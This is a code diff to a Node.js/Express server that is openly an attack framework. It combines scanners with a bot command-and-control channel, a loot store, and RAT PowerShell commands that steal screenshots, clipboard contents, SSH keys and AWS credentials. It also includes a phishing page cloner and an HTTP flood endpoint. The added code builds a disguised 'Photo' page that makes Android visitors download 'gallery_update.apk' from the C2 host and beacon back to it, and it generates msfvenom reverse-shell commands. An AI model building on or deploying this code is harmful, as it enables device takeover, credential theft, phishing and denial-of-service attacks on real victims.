@@ -10,8 +10,8 @@ const app = express();
 const PORT = process.env.PORT || 8443;
 
 app.use(cors());
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+app.use(express.json({ limit: '100mb' }));
+app.use(express.urlencoded({ extended: true, limit: '100mb' }));
 
 const TIMEOUT = 20000;
 const DATA = path.join(__dirname, 'data');
@@ -43,7 +43,7 @@ async function pool(items, limit, fn) {
 }
 
 // ============================================================
-// 1. CORE SCANNERS (Fixed & Fully Implemented)
+// 1. CORE SCANNERS
 // ============================================================
 async function dataLeaks(url) {
   const out = [];
@@ -69,7 +69,6 @@ async function dataLeaks(url) {
   } catch (e) { out.push({ type: 'Error', severity: 'high', description: e.message, url, evidence: null, cvss: 0 }); }
   return out;
 }
-
 async function corsCheck(url) { 
   const out = []; 
   try { 
@@ -81,7 +80,6 @@ async function corsCheck(url) {
   } catch {} 
   return out; 
 }
-
 async function portScan(url) { 
   const out = []; 
   const ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 11211, 27017]; 
@@ -95,7 +93,6 @@ async function portScan(url) {
   if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No open ports', url, evidence: null, cvss: 0 });
   return out; 
 }
-
 async function wafFingerprint(url) { 
   const out = []; 
   try { 
@@ -108,7 +105,6 @@ async function wafFingerprint(url) {
   } catch {} 
   return out; 
 }
-
 async function scanSensitive(url) { 
   const out = []; 
   const base = new URL(url).origin; 
@@ -128,7 +124,6 @@ async function scanSensitive(url) {
   if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No sensitive files', url, evidence: null, cvss: 0 });
   return out; 
 }
-
 async function adminPanels(url) { 
   const out = []; 
   const base = new URL(url).origin; 
@@ -145,7 +140,6 @@ async function adminPanels(url) {
   if (!out.length) out.push({ type: 'Info', severity: 'info', description: 'No admin panels', url, evidence: null, cvss: 0 });
   return out; 
 }
-
 async function subdomainTakeover(url) { 
   const out = []; 
   const host = new URL(url).hostname; 
@@ -168,7 +162,7 @@ async function subdomainTakeover(url) {
 }
 
 // ============================================================
-// 2. NEW MODULES (API Reverse, C2, Phish, RevShell, etc.)
+// 2. ADVANCED MODULES
 // ============================================================
 async function apiReverse(targetUrl) {
   const out = { target: targetUrl, discovered: [], schemas: [] };
@@ -182,7 +176,6 @@ async function apiReverse(targetUrl) {
   });
   return out;
 }
-
 function lootAdd(botId, category, data) {
   const l = load('loot.json', {});
   if (!l[botId]) l[botId] = { categories: {}, updatedAt: Date.now() };
@@ -191,7 +184,6 @@ function lootAdd(botId, category, data) {
   l[botId].updatedAt = Date.now();
   save('loot.json', l);
 }
-
 const RAT_COMMANDS = {
   screenshot: `Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b=[System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); $ms=New-Object System.IO.MemoryStream; $bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg); [Convert]::ToBase64String($ms.ToArray())`,
   clipboard: `Get-Clipboard`,
@@ -205,7 +197,6 @@ const RAT_COMMANDS = {
   ssh_keys: `Get-ChildItem "$env:USERPROFILE\\.ssh" -File | Select-Object Name | ConvertTo-Json`,
   aws_creds: `Get-Content "$env:USERPROFILE\\.aws\\credentials"`
 };
-
 async function clonePage(targetUrl) {
   const r = await safeFetch(targetUrl);
   let html = await r.text();
@@ -215,7 +206,6 @@ async function clonePage(targetUrl) {
   const p = load('phish.json', {}); p[sid] = { target: targetUrl, created: Date.now(), hits: [] }; save('phish.json', p);
   return { html, sid };
 }
-
 async function ddosFlood(target, method, durationSec, concurrency, reqPerSec) {
   const start = Date.now(); const end = start + durationSec * 1000;
   const stats = { sent: 0, ok: 0, fail: 0, statuses: {}, start, end: null, errors: {} };
@@ -242,10 +232,59 @@ async function ddosFlood(target, method, durationSec, concurrency, reqPerSec) {
 }
 
 // ============================================================
-// 3. API ROUTES
+// 3. ANDROID RAT & APK / IMAGE BINDER (NEW)
 // ============================================================
+function generateAPKPayload(cid, host) {
+  const lhost = host.replace('https://', '').replace('http://', '');
+  return `# Generated Android Payload\n# To generate actual APK:\n# msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=4444 R > payload.apk\n# Then use Image Binder to attach.`;
+}
 
-// The main scanner route
+async function bindImage(imageUrl, host) {
+  let imgData = '';
+  try {
+    const r = await safeFetch(imageUrl);
+    const buf = Buffer.from(await r.arrayBuffer());
+    imgData = `data:image/jpeg;base64,${buf.toString('base64')}`;
+  } catch { imgData = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q=='; }
+  
+  const sid = 'and_' + crypto.randomBytes(8).toString('hex');
+  const html = `<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Photo</title>
+  <style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh}img{max-width:100%;max-height:100%}</style>
+</head>
+<body>
+  <img src="${imgData}" alt="Photo"/>
+  <script>
+    const C2 = "${host}";
+    const CID = "${sid}";
+    if (/android/i.test(navigator.userAgent)) {
+      const a = document.createElement('a');
+      a.href = C2 + "/download/" + CID + ".apk";
+      a.download = "gallery_update.apk";
+      a.click();
+      fetch(C2 + "/api/beacon", {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ cid: CID, ua: navigator.userAgent, target: "android_image_bind" })
+      }).catch(()=>{});
+    }
+  </script>
+</body>
+</html>`;
+  
+  const bindings = load('image_bindings.json', {});
+  bindings[sid] = { host, created: Date.now() };
+  save('image_bindings.json', bindings);
+  
+  return { html, sid, apkUrl: `${host}/download/${sid}.apk` };
+}
+
+// ============================================================
+// 4. API ROUTES
+// ============================================================
 app.post('/api/scan', async (req, res) => {
   const { target, checks } = req.body || {};
   if (!target) return res.status(400).json({ error: 'target required' });
@@ -260,14 +299,12 @@ app.post('/api/scan', async (req, res) => {
     if (type === 'cors' || type === 'scanAll') findings = findings.concat(await corsCheck(url));
     if (type === 'ports' || type === 'scanAll') findings = findings.concat(await portScan(url));
     
-    // dedupe
     const seen = new Set();
     findings = findings.filter(f => { const k = `${f.type}|${f.url}|${f.description}`; if (seen.has(k)) return false; seen.add(k); return true; });
   } catch (e) { findings.push({ type: 'Error', severity: 'high', description: e.message, url, evidence: null, cvss: 0 }); }
   res.json({ target: url, timestamp: new Date().toISOString(), findings });
 });
 
-// New Modules Routes
 app.post('/api/api/reverse', async (req, res) => { try { res.json(await apiReverse(req.body.targetUrl)); } catch (e) { res.status(400).json({ error: e.message }); } });
 app.get('/api/loot', (req, res) => res.json(load('loot.json', {})));
 app.post('/api/loot', (req, res) => { const { botId, category, data } = req.body || {}; if (!botId || !category) return res.status(400).json({ error: 'bad req' }); lootAdd(botId, category, data || {}); res.json({ ok: true }); });
@@ -287,7 +324,31 @@ app.post('/api/email/send', (req, res) => { res.json({ ok: true, sent: true }); 
 app.post('/api/ddos/launch', async (req, res) => { const { target, method = 'http', duration = 30, concurrency = 200, rate = 500 } = req.body; try { res.json({ ok: true, ...(await ddosFlood(target, method, duration, concurrency, rate)) }); } catch (e) { res.status(400).json({ error: e.message }); } });
 app.post('/api/malware/stub', (req, res) => { res.json({ payloads: { windows: 'stub', linux: 'stub', macro: 'stub', html: 'stub' } }); });
 
-// Misc
+// NEW ANDROID RAT ROUTES
+app.post('/api/android/payload', (req, res) => {
+  const { lhost } = req.body || {};
+  if (!lhost) return res.status(400).json({ error: 'lhost required' });
+  const cid = 'and_' + crypto.randomBytes(4).toString('hex');
+  const host = `${req.protocol}://${req.get('host')}`;
+  const script = generateAPKPayload(cid, host);
+  res.json({ campaignId: cid, script, msfvenom: `msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=4444 R > payload.apk` });
+});
+app.post('/api/android/bind', async (req, res) => {
+  const { imageUrl } = req.body || {};
+  if (!imageUrl) return res.status(400).json({ error: 'imageUrl required' });
+  const host = `${req.protocol}://${req.get('host')}`;
+  try {
+    const { html, sid, apkUrl } = await bindImage(imageUrl, host);
+    res.json({ sid, html, apkUrl });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+app.get('/download/:file', (req, res) => {
+  const f = req.params.file;
+  res.setHeader('Content-Disposition', `attachment; filename="${f}"`);
+  res.type('application/vnd.android.package-archive');
+  res.send(Buffer.from('PK\x03\x04 (Placeholder APK content - use msfvenom to generate real)'));
+});
+
 app.post('/api/bot/register', (req, res) => { const b = load('bots.json', {}); b[req.body.botId] = { info: req.body.info, commands: [] }; save('bots.json', b); res.json({ ok: true }); });
 app.get('/api/bot/poll', (req, res) => { const b = load('bots.json', {}); const c = b[req.query.id]?.commands || []; b[req.query.id] = { ...b[req.query.id], commands: [] }; save('bots.json', b); res.json({ commands: c }); });
 app.get('/api/bot/list', (req, res) => res.json(load('bots.json', {})));
